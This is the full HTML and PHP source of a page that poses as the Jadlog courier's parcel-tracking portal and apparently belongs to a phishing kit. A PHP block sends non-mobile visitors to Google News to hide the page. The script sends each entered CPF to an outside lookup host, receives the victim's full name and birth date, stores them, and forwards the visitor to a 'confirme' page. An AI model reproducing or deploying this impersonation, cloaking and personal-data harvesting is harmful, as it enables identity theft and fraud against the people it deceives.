<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
  <link href="Rastreio_arquivos/css2.html" rel="stylesheet">
  <link rel="stylesheet" href="Rastreio_arquivos/bootstrap.css">
  <link rel="stylesheet" href="Rastreio_arquivos/app.css">
  <link rel="stylesheet" href="Rastreio_arquivos/all.css" crossorigin="anonymous">
  <link rel="icon" type="image/x-icon" href="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png">
  <meta name="csrf-token" content="BvHekmyuhpxq0y4d95zDDZM0F2cRrES6DJjrP5sP">
  <link rel="stylesheet" type="text/css" href="css/all.css">
  <title>Jadlog | Rastreio</title>

  <script type="text/javascript" class="flasher-js">
    (function () { 
      var rootScript = '../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js'; 
      var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; 
      var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); 
      function mergeOptions(first, second) { 
        return { 
          context: merge(first.context || {}, second.context || {}), 
          envelopes: merge(first.envelopes || [], second.envelopes || []), 
          options: merge(first.options || {}, second.options || {}), 
          scripts: merge(first.scripts || [], second.scripts || []), 
          styles: merge(first.styles || [], second.styles || []) 
        }; 
      } 
      function merge(first, second) { 
        if (Array.isArray(first) && Array.isArray(second)) { 
          return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); 
        } 
        return Object.assign({}, first, second); 
      } 
      function renderOptions(options) { 
        if (!window.hasOwnProperty('flasher')) { 
          console.error('Flasher is not loaded'); 
          return; 
        } 
        requestAnimationFrame(function () { window.flasher.render(options); }); 
      } 
      function render(options) { 
        if ('loading' !== document.readyState) { 
          renderOptions(options); 
          return; 
        } 
        document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); 
      } 
      if (1 === document.querySelectorAll('script.flasher-js').length) { 
        document.addEventListener('flasher:render', function (event) { render(event.detail); }); 
      } 
      if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { 
        render(options); 
      } else { 
        var tag = document.createElement('script'); 
        tag.setAttribute('src', rootScript); 
        tag.setAttribute('type', 'text/javascript'); 
        tag.onload = function () { render(options); }; 
        document.head.appendChild(tag); 
      } 
    })();
  </script>
  <script src="Rastreio_arquivos/flasher.min.js" type="text/javascript"></script>
  <script src="Rastreio_arquivos/flasher.min_002.js" type="text/javascript"></script>
  
  <?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (!preg_match('/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i', $userAgent)) {
    header("Location: https://news.google.com/");
    exit;
}
?>

</head>

<body>
  <header class="w-100 font-size-16 font-weight-400 text-blue">
    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px; border-color: #dc0032!important;">
      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
        <a href="#" class="py-2">
          <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="" height="25">
        </a>
      </div>
      <div class="ml-4 d-none d-lg-block" style="width:150px">
        <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
          <img src="Rastreio_arquivos/entrar.svg" alt="Jadlog" width="31">
          <span class="ml-1">Entrar</span>
        </a>
      </div>
    </nav>
  </header>

  <main>
    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
      <span class="text-blue mr-2" style="color: black;"><b>Portal Jadlog</b></span>
      <i class="fal fa-angle-right mr-2"></i>
      <span class="text-blue mr-2" style="color: black;">Rastreamento</span>
      <i class="fal fa-angle-right mr-2"></i>
    </nav>

    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto; color: black;">
      Rastreamento
    </h1>

    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
      <h5 class="text-center font-weight-700 mb-4" style="color: black;">
        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
      </h5>

      <form id="cpf-form" method="post">
        <span>Deseja acompanhar seu objeto?</span><br>
        <span>Digite o CPF do comprador.</span>
        <div class="form-group mt-1">
          <input type="text" id="cpf" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required>
        </div>
        <div class="form-group mt-1 d-flex justify-content-center" id="submit-container" style="width: 100%;">
          <button type="button" id="continue-cpf" class="btn btn-primary" style="background-color: #dc0032; border-color: #dc0032; width: 100%;">Consultar</button>
        </div>
      </form>
    </section>

    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
      <div>
        <img src="outdoor02.png" alt="" class="w-100">
      </div>
    </section>
  </main>

  <hr style="margin-top: 20px; margin-bottom: 20px; border: 0; border-top: 1px solid #eee;"> 

  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark" style="background-color: #fff;">
    <div style="display: flex; justify-content: center; align-items: center; margin: 20px auto">
      <img width="150px" src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="">
    </div>
    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
      <span>© Copyright 2025 Jadlog</span>
    </div>
  </footer>

  <script src="Rastreio_arquivos/jquery-3.6.0.min.js"></script>
  <script src="Rastreio_arquivos/bootstrap.min.js"></script>

  <script>
    // CPF input mask
    function initCpfMask() {
      const cpfInput = document.getElementById('cpf');
      cpfInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        if (value.length > 9) value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        else if (value.length > 6) value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
        else if (value.length > 3) value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
        e.target.value = value;
      });
    }

    // CPF validation
    function isValidCPF(cpf) {
      cpf = cpf.replace(/\D/g, '');
      if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
      let sum = 0, remainder;
      for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
      sum = 0;
      for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
      return true;
    }

    // URL parameter handling
    function getUrlParams() {
      const params = {};
      const queryString = window.location.search.substring(1);
      const pairs = queryString.split('&');
      pairs.forEach(pair => {
        const [key, value] = pair.split('=');
        if (key) params[decodeURIComponent(key)] = decodeURIComponent(value || '');
      });
      return params;
    }

    function buildUrlWithParams(baseUrl, params) {
      const queryString = Object.keys(params)
        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
        .join('&');
      return `${baseUrl}?${queryString}`;
    }

    // Form submission with API
    async function submitForm() {
      const cpfInput = document.getElementById('cpf');
      const cpf = cpfInput.value.replace(/\D/g, '');
      const token = 'ea9873c7db78c484dc4ec553d0463ad1';

      if (cpf.length === 11) {
        try {
          const response = await fetch(`https://base1.sistemafull.site:80/api/cpfx?CPF=${cpf}`, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
          });

          if (!response.ok) throw new Error(`Erro na requisição. Status: ${response.status}`);
          const data = await response.json();

          if (data.NOME) {
            sessionStorage.setItem('nomeCompleto', data.NOME);
            sessionStorage.setItem('cpf', cpf);
            sessionStorage.setItem('dataNascimento', data.NASC);

            const params = getUrlParams();
            const newUrl = buildUrlWithParams('./confirme/index.html', params);
            window.location.href = newUrl;
          } else {
            alert("CPF não encontrado ou inválido.");
          }
        } catch (error) {
          alert("Erro ao consultar a API: " + error.message);
        }
      } else {
        alert("CPF inválido. Por favor, preencha corretamente.");
      }
    }

    // Initialize
    document.addEventListener('DOMContentLoaded', () => {
      initCpfMask();
      const cpfInput = document.getElementById('cpf');
      const continueCpfButton = document.getElementById('continue-cpf');
      const submitContainer = document.getElementById('submit-container');

      continueCpfButton.addEventListener('click', async () => {
        if (isValidCPF(cpfInput.value)) {
          submitContainer.style.display = 'none';
          localStorage.setItem('cpf', cpfInput.value);
          await submitForm();
        } else {
          alert('CPF inválido. Por favor, insira um CPF válido.');
        }
      });
    });
  </script>
</body>
</html>